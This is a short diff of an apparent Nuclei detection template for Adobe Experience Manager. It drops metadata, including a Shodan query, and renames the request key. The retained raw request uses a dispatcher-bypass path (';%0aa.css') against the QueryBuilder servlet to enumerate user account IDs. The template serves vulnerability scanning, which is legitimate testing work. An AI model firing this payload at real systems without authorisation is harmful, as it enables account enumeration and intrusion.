@@ -4,12 +4,9 @@ info:
   name: Query JCR role via QueryBuilder Servlet
   author: DhiyaneshDk
   severity: info
-  metadata:
-    max-request: 1
-    shodan-query: http.component:"Adobe Experience Manager"
   tags: aem
 
-http:
+requests:
   - raw:
       - |
         GET /bin/querybuilder.json.;%0aa.css?p.hits=full&property=rep:authorizableId&type=rep:User HTTP/1.1
